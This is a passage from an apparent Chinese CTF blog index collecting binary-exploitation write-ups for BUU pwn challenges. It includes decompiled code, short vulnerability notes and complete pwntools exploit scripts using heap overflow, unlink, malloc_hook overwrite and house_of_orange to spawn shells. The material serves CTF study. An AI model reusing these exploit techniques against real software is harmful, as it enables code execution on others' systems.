[rsp+18h] [rbp-8h] for ( i = 0; i \u003c= 15; ++i ) { if ( !*(_DWORD *)(24LL * i + a1) ) { printf(\"Size: \"); v2 = sub_138C(); if ( v2 \u003e 0 ) { if ( v2 \u003e 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf(\"Allocate Index %d\\n\", (unsigned int)i); } return; } } } fill __int64 __fastcall sub_E7F(__int64 a1) { __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = sub_138C(); v2 = result; if ( (int)result \u003e= 0 \u0026\u0026 (int)result \u003c= 15 ) { result = *(unsigned int *)(24LL * (int)result + a1); if ( (_DWORD)result == 1 ) { printf(\"Size: \"); result = sub_138C(); v3 = result; if ( (int)result \u003e 0 ) { printf(\"Content: \"); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); } } } return result; } free __int64 __fastcall sub_F50(__int64 a1) { __int64 result; // rax int v2; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = sub_138C(); v2 = result; if ( (int)result \u003e= 0 \u0026\u0026 (int)result \u003c= 15 ) { result = *(unsigned int *)(24LL * (int)result + a1); if ( (_DWORD)result == 1 ) { *(_DWORD *)(24LL * v2 + a1) = 0; *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL; free(*(void **)(24LL * v2 + a1 + 16)); result = 24LL * v2 + a1; *(_QWORD *)(result + 16) = 0LL; } } return result; } dump int __fastcall sub_1051(__int64 a1) { int result; // eax int v2; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = sub_138C(); v2 = result; if ( result \u003e= 0 \u0026\u0026 result \u003c= 15 ) { result = *(_DWORD *)(24LL * result + a1); if ( result == 1 ) { puts(\"Content: \"); sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8)); result = puts(byte_14F1); } } return result; } 在fill中存在溢出，可以通过overlapping泄露libc，再house_of_spirit修改__malloc_hook。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./0ctf_2017_babyheap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29355) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) def add(size): sh.sendlineafter(\"Command: \",\"1\") sh.sendlineafter(\"Size: \",str(size)) def fill(index, size, content): sh.sendlineafter(\"Command: \",\"2\") sh.sendlineafter(\"Index: \",str(index)) sh.sendlineafter(\"Size: \",str(size)) sh.sendlineafter(\"Content: \",str(content)) def free(index): sh.sendlineafter(\"Command: \",\"3\") sh.sendlineafter(\"Index: \",str(index)) def show(index): sh.sendlineafter(\"Command: \",\"4\") sh.sendlineafter(\"Index: \",str(index)) #gdb.attach(sh) add(0x10) #0 add(0x80) #1 add(0x100) #2 add(0x10) #3 payload = '\\x00'*0x10+p64(0)+p64(0x1a1) fill(0,len(payload),payload) #gdb.attach(sh) free(1) add(0x190) #1 payload = '\\x00'*0x80+p64(0)+p64(0x111) fill(1,len(payload),payload) free(2) show(1) main_arena = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) malloc_hook = main_arena -88 - 0x10 fake_chunk = malloc_hook -0x23 libc_base=main_arena-88-0x3C4B20 one_gadget = libc_base + 0x4526a leak('main_arena', main_arena) leak('malloc_hook',malloc_hook) leak('fake_chunk', fake_chunk) leak('libc_base', libc_base) add(0x100) #2 add(0x60) #4 add(0x60) #5 free(4) payload = p64(0)*3+p64(0x71)+p64(fake_chunk) fill(3,len(payload),payload) add(0x60) #4 add(0x60) #6 payload = 'a'*0x13+p64(one_gadget) fill(6,len(payload),payload) add(0x10) #7 sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-2"},{"categories":["Writeups"],"content":"BUU-heapcreator","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-heapcreator"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-3"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create_heap() { __int64 v0; // rbx int i; // [rsp+4h] [rbp-2Ch] size_t size; // [rsp+8h] [rbp-28h] char buf[8]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-18h] v5 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*(\u0026heaparray + i) ) { *(\u0026heaparray + i) = malloc(0x10uLL); if ( !*(\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(1); } printf(\"Size of Heap : \"); read(0, buf, 8uLL); size = atoi(buf); v0 = (__int64)*(\u0026heaparray + i); *(_QWORD *)(v0 + 8) = malloc(size); if ( !*((_QWORD *)*(\u0026heaparray + i) + 1) ) { puts(\"Allocate Error\"); exit(2); } *(_QWORD *)*(\u0026heaparray + i) = size; printf(\"Content of heap:\"); read_input(*((_QWORD *)*(\u0026heaparray + i) + 1), size); puts(\"SuccessFul\"); return __readfsqword(0x28u) ^ v5; } } return __readfsqword(0x28u) ^ v5; } edit unsigned __int64 edit_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Content of heap : \"); read_input(*((_QWORD *)*(\u0026heaparray + v1) + 1), *(_QWORD *)*(\u0026heaparray + v1) + 1LL); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } show unsigned __int64 show_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Size : %ld\\nContent : %s\\n\", *(_QWORD *)*(\u0026heaparray + v1), *((const char **)*(\u0026heaparray + v1) + 1)); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } delete unsigned __int64 delete_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { free(*((void **)*(\u0026heaparray + v1) + 1)); free(*(\u0026heaparray + v1)); *(\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } crearte时，申请一个0x10的控制chunk，存放申请chunk的size和地址。 在edit中有一个off-by-one，可以利用用来修改控制chunk，向其size写一个较大的值，free掉。被我们修改的控制chunk包含了正在使用的chunk。且用户申请的chunk在控制chunk的上面，可以覆盖其内容。通过修改chunk指针，leak libc并修改got表。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-3"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./heapcreator' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27001) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) free_got = elf.got['free'] def add(size, content): sh.sendline(\"1\") sh.sendafter(\"Size of Heap : \", str(size)) sh.sendafter(\"Content of heap:\", str(content)) def edit(index, content): sh.sendline(\"2\") sh.sendafter(\"Index :\",str(index)) sh.sendafter(\"Content of heap : \", str(content)) def show(index): sh.sendline(\"3\") sh.sendafter(\"Index :\",str(index)) def free(index): sh.sendline(\"4\") sh.sendafter(\"Index :\",str(index)) add(0x18,'a'*0x18) #0 add(0x10,'b'*0x10) #1 add(0x10,'c'*0x10) #2 add(0x10,'b'*0x10) #3 #gdb.attach(sh) edit(0, '/bin/sh\\x00'*3+'\\x81') free(1) add(0x70, p64(0)*8+p64(0x8)+p64(free_got)) #1 show(2) free_addr = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) leak('free',hex(free_addr)) libc = LibcSearcher(\"free\", free_addr) libcbase = free_addr - libc.dump(\"free\") system = libcbase + libc.dump('system') #gdb.attach(sh) edit(2,p64(system)) free(0) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-3"},{"categories":["Writeups"],"content":"BUU-[ZJCTF2019]easyheap","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-zjctf2019easyheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-4"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create_heap() { int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*(\u0026heaparray + i) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); size = atoi(buf); *(\u0026heaparray + i) = malloc(size); if ( !*(\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(2); } printf(\"Content of heap:\"); read_input(*(\u0026heaparray + i), size); puts(\"SuccessFul\"); return __readfsqword(0x28u) ^ v4; } } return __readfsqword(0x28u) ^ v4; } edit unsigned __int64 edit_heap() { int v1; // [rsp+4h] [rbp-1Ch] __int64 v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); v2 = atoi(buf); printf(\"Content of heap : \"); read_input(*(\u0026heaparray + v1), v2); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v4; } delete unsigned __int64 delete_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { free(*(\u0026heaparray + v1)); *(\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } 使用heaparray维护了一个堆指针数组，在edit_heap中可以写任意字节，有溢出。delete时，将指针进行了销毁，没有UAF。 想到使用unlink改写数组指针。由于BUU环境与原题不一样所有没办法使用magic直接打印flag，使用修改got表的方法。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-4"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./easyheap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29537) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') system_plt = elf.plt[\"system\"] free_got = elf.got[\"free\"] def add(size,content): sh.sendline(\"1\") sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap:', str(content)) def edit(index, size, content): sh.sendline(\"2\") sh.sendafter(\"Index :\", str(index)) sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap : ', str(content)) def free(index): sh.sendline(\"3\") sh.sendafter(\"Index :\", str(index)) heap_arry = 0x6020E0 magic = 0x6020C0 add(0x100,'a'*0x100) #0 add(0x100,'b'*0x100) #1 add(0x10,\"/bin/sh\\x00\\x00\\x00\") #2 payload = p64(0)+p64(0x100)+p64(heap_arry-0x18)+p64(heap_arry-0x10) payload=payload.ljust(0x100,'a') payload+=p64(0x100)+p64(0x110) edit(0, 0x110, payload) free(1) #gdb.attach(sh) payload = p64(0)+p64(free_got)+p64(free_got)+p64(free_got) edit(0,len(payload),payload) payload= p64(system_plt)+p64(system_plt) edit(0,len(payload),payload) free(2) #add(0x10,'c'*0x10) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-4"},{"categories":["Writeups"],"content":"安恒三月赛","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#安恒三月赛"},{"categories":["Writeups"],"content":"fruitpie","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#fruitpie"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-5"},{"categories":["Writeups"],"content":"IDA int __cdecl main(int argc, const char **argv, const char **envp) { _DWORD size[3]; // [rsp+4h] [rbp-1Ch] BYREF char *v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(argc, argv, envp); welcome(); puts(\"Enter the size to malloc:\"); size[0] = readInt(); v5 = (char *)malloc(size[0]); if ( !v5 ) { puts(\"Malloc Error\"); exit(0); } printf(\"%p\\n\", v5); puts(\"Offset:\"); _isoc99_scanf(\"%llx\", \u0026size[1]); puts(\"Data:\"); read(0, \u0026v5[*(_QWORD *)\u0026size[1]], 0x10uLL); malloc(0xA0uLL); close(1); return 0; } 可以申请任意大小的内存，之后chunk为基准可以向任意偏移地址写0x10字节。 思路是，申请一个很大的chunk，让其通过mmap进行分配，以此计算libcbase。再通过向__malloc_hook写one gadget获得权限。使用one_gadget栈需要满足一定的条件，所以通过将__malloc_hook覆盖为realloc进行调栈。 malloc ---\u003e __malloc_hook ---\u003e realloc ---\u003e __realloc_hook ---\u003e one_gadget 查看realloc的汇编代码: .text:0000000000098CA0 ; __unwind { .text:0000000000098CA0 push r15 ; Alternative name is '__libc_realloc' .text:0000000000098CA2 push r14 .text:0000000000098CA4 push r13 .text:0000000000098CA6 push r12 .text:0000000000098CA8 push rbp .text:0000000000098CA9 push rbx .text:0000000000098CAA sub rsp, 18h .text:0000000000098CAE mov rax, cs:__realloc_hook_ptr .text:0000000000098CB5 mov rax, [rax] .text:0000000000098CB8 test rax, rax .text:0000000000098CBB jnz loc_98F50 .text:0000000000098CC1 test rsi, rsi 发现其有很多push，我们就通过这些指令来调节栈帧。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-5"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./pwn' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27982) elf = ELF(binary,checksec=False) libc = ELF('./libc.so.6') one_gadget=[0x4f365,0x4f3c2,0x10a45c] sh.sendafter('Enter the size to malloc:', str(99999999)) sh.recvuntil('0x') addr = int(sh.recv(12),16) leak('chunk',hex(addr)) libc_base=addr+0x5f5eff0 leak('libc base',hex(libc_base)) one=libc_base+one_gadget[1] realloc=libc_base+libc.sym['realloc'] #gdb.attach(sh) offset=libc.sym[\"__malloc_hook\"]+0x5f5eff0 leak('offset',hex(offset)) sh.sendlineafter('Offset:',hex(offset)) sh.sendafter('Data:',p64(one)+p64(realloc+0x4)) sh.interactive() 学习到通过mmap的内存来泄露libc，通过realloc进行调栈。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-5"},{"categories":["Writeups"],"content":"sort_it","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#sort_it"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-6"},{"categories":["Writeups"],"content":"IDA int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rdi __int64 v4; // rdx __int64 v5; // rsi __int64 v6; // rdx char v8; // [rsp+Fh] [rbp-71h] __int64 v9; // [rsp+10h] [rbp-70h] BYREF __int64 v10; // [rsp+18h] [rbp-68h] BYREF __int64 v11[12]; // [rsp+20h] [rbp-60h] BYREF v11[11] = __readfsqword(0x28u); v8 = 0; v11[0] = 'egnaro'; v11[1] = 'eton'; v11[2] = 'elppa'; v11[3] = 'puc'; v11[4] = 'daerb'; v11[5] = 'arbez'; v11[6] = 'dnah'; v11[7] = 'naf'; v11[8] = 'noil'; v11[9] = 'licnep'; clear(argc, argv, envp); puts(\"Sort the following words in alphabetical order.\\n\"); print_words(v11); v3 = \"Press any key to continue...\"; printf(\"Press any key to continue...\"); getchar(); while ( v8 != 1 ) { clear(v3, argv, v4); print_words(v11); printf(\"Enter the number for the word you want to select: \"); __isoc99_scanf(\"%llu\", \u0026v9); getchar(); --v9; printf(\"Enter the number for the word you want to replace it with: \"); __isoc99_scanf(\"%llu\", \u0026v10); getchar(); --v10; v5 = v9; swap(v11, v9, v10); clear(v11, v5, v6); print_words(v11); printf(\"Are the words sorted? [y/n]: \"); argv = (const char **)(\u0026word_10 + 1); v3 = \u0026yn; fgets(\u0026yn, 0x11, stdin); if ( yn != 'n' ) { if ( yn != 'y' ) { puts(\"Invalid choice\"); getchar(); exit(0); } v8 = 1; } } if ( (unsigned int)check((__int64)v11) ) { puts(\"You lose!\"); exit(0); } puts(\"You win!!!!!\"); return 0; } 对数组中的元素进行排序，可以交换任意两个元素，这里存在明显的数组超界。通过数组超界泄露代码段基址，libc基址和栈地址。 在函数中没有栈溢出可以利用，但是fgets(\u0026yn, 0x11, stdin);，这里多读了几个字节，我们可以将gadget放在这里。然后计算出栈到yn的距离，从将gadget转移到栈上。 最后我们还需要对数组进行排序才能正常的ret，所以为了方便我们通过同样的手段将所有的元素都变成一样的。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-6"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./sort_it' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('challenge.nahamcon.com on port', 31286) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so',checksec=False) sh.send('\\n') sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','14') leak_libc = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libcbase = leak_libc - 0x020840 binsh=libcbase+0x18ce17 system = libcbase+0x0453a0 leak('libc base',libcbase) sh.sendlineafter('Are the words sorted? [y/n]: ','n') sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','13') leak_main = u64(sh.recvuntil('\\x55')[-6:].ljust(8,'\\x00')) textbase = leak_main- elf.sym['__libc_csu_init'] leak('text base',textbase) pop_rdi = textbase + 0x00001643 yn= textbase+0x4030 sh.sendlineafter('Are the words sorted? [y/n]: ','n') sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','11') stack = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-(0xe40-0xd00) leak('leak_stack',stack) sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi)) sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','11') sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi)) sh.sendlineafter('Enter the number for the word you want to select: ','14') sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(binsh)) sh.sendlineafter('Enter the number for the word you want to select: ','15') sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) #gdb.attach(sh) sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(system)) sh.sendlineafter('Enter the number for the word you want to select: ','16') sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) for i in range(1,10): sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+'a'*8) sh.sendlineafter('Enter the number for the word you want to select: ',str(i)) sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) sh.sendlineafter('Are the words sorted? [y/n]: ','y') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-6"},{"categories":["Writeups"],"content":"Challenges_100-Week_7 Challenges Tricks BUU-houseoforange_hitcon_2016 house_of_orange BUU-npuctf2020-easyheap off-by-one+ovlapping chunk BUU-hitcon2018_children_tcache off-by-null+tcache_psisoning BUU-vn2020-easyTHeap tcache_psisoning+hacking tcache struct BUU-vn2020-simpleheap off-by-one+ovlapping chunk+house_of_spirit BUU-vn2020-warmup orw BUU-hitcontraining-stkof unlink ","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#challenges_100-week_7"},{"categories":["Writeups"],"content":"BUU-houseoforange_hitcon_2016","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-houseoforange_hitcon_2016"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec"},{"categories":["Writeups"],"content":"IDAadd int add() { unsigned int size; // [rsp+8h] [rbp-18h] int size_4; // [rsp+Ch] [rbp-14h] _QWORD *v3; // [rsp+10h] [rbp-10h] _DWORD *v4; // [rsp+18h] [rbp-8h] if ( add_count \u003e 3u ) { puts(\"Too many house\"); exit(1); } v3 = malloc(0x10uLL); printf(\"Length of name :\"); size = read_num(); if ( size \u003e 0x1000 ) size = 0x1000; v3[1] = malloc(size); if ( !v3[1] ) { puts(\"Malloc error !!!\"); exit(1); } printf(\"Name :\"); read_data(v3[1], size); v4 = calloc(1uLL, 8uLL); printf(\"Price of Orange:\"); *v4 = read_num(); color_list(); printf(\"Color of Orange:\"); size_4 = read_num(); if ( size_4 != 56746 \u0026\u0026 (size_4 \u003c= 0 || size_4 \u003e 7) ) { puts(\"No such color\"); exit(1); } if ( size_4 == 56746 ) v4[1] = 56746; else v4[1] = size_4 + 30; *v3 = v4; color = v3; ++add_count; return puts(\"Finish\"); } up int up() { _DWORD *v1; // rbx unsigned int v2; // [rsp+8h] [rbp-18h] int v3; // [rsp+Ch] [rbp-14h] if ( up_counter \u003e 2u ) return puts(\"You can't upgrade more\"); if ( !color ) return puts(\"No such house !\"); printf(\"Length of name :\"); v2 = read_num(); if ( v2 \u003e 0x1000 ) v2 = 4096; printf(\"Name:\"); read_data(color[1], v2); printf(\"Price of Orange: \"); v1 = (_DWORD *)*color; *v1 = read_num(); color_list(); printf(\"Color of Orange: \"); v3 = read_num(); if ( v3 != 56746 \u0026\u0026 (v3 \u003c= 0 || v3 \u003e 7) ) { puts(\"No such color\"); exit(1); } if ( v3 == 56746 ) *(_DWORD *)(*color + 4LL) = 56746; else *(_DWORD *)(*color + 4LL) = v3 + 30; ++up_counter; return puts(\"Finish\"); } see int see() { int v0; // eax int result; // eax int v2; // eax if ( !color ) return puts(\"No such house !\"); if ( *(_DWORD *)(*color + 4LL) == 56746 ) { printf(\"Name of house : %s\\n\", (const char *)color[1]); printf(\"Price of orange : %d\\n\", *(unsigned int *)*color); v0 = rand(); result = printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)\u0026unk_203080 + v0 % 8)); } else { if ( *(int *)(*color + 4LL) \u003c= 30 || *(int *)(*color + 4LL) \u003e 37 ) { puts(\"Color corruption!\"); exit(1); } printf(\"Name of house : %s\\n\", (const char *)color[1]); printf(\"Price of orange : %d\\n\", *(unsigned int *)*color); v2 = rand(); result = printf(\"\\x1B[%dm%s\\x1B[0m\\n\", *(unsigned int *)(*color + 4LL), *((const char **)\u0026unk_203080 + v2 % 8)); } return result; } 漏洞点为：在up中有溢出。 如题，使用house_of_orange，本质上house_of_orange中使用了unsortedbin attack将伪造的fake FILE链入_IO_list_all中，实现控制程序执行流。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" local=0 binary='./houseoforange_hitcon_2016' #gdb.attach(sh) if local: #context.log_level=\"DEBUG\" sh=process(binary) else: sh=remote('node3.buuoj.cn',27919) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.27.so',checksec=False) vtable_offset=0xd8 _IO_write_base=0x20 _IO_write_ptr=0x28 def add(length, name, price, color): sh.recvuntil('choice : ') sh.sendline('1') sh.sendlineafter('Length of name :', str(length)) sh.sendafter('Name :', str(name)) sh.sendafter('Price of Orange:', str(price)) sh.sendafter('Color of Orange:', str(color)) def see(): sh.recvuntil('choice : ') sh.sendline('2') def up(length, name, price, color): sh.recvuntil('choice : ') sh.sendline('3') sh.sendlineafter('Length of name :', str(length)) sh.sendafter('Name:', str(name)) sh.sendafter('Price of Orange:', str(price)) sh.sendafter('Color of Orange:', str(color)) #get a free chunk add(0x80,'a'*8,111,0xddaa) up(0x450,'\\x00'*0x80+p64(0)+p64(0x21)+'\\x00'*0x10+p64(0)+p64(0xf31),222,0xddaa) add(0x1000,'c'*8,333,0xddaa) add(0x400,'a'*8,444,0xddaa) #fake vtable #gdb.attach(sh) see() main_arena=u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) malloc_hook = main_arena-1640-0x10 libc = LibcSearcher('__malloc_hook',malloc_hook) libcbase = malloc_hook-libc.dump('__malloc_hook') leak('main hook',malloc_hook) leak('libc base',libcbase) IO_list_all = libcbase +libc.dump('_IO_list_all') system=libcbase+libc.dump('system') leak('IO_list_all',IO_list_all) 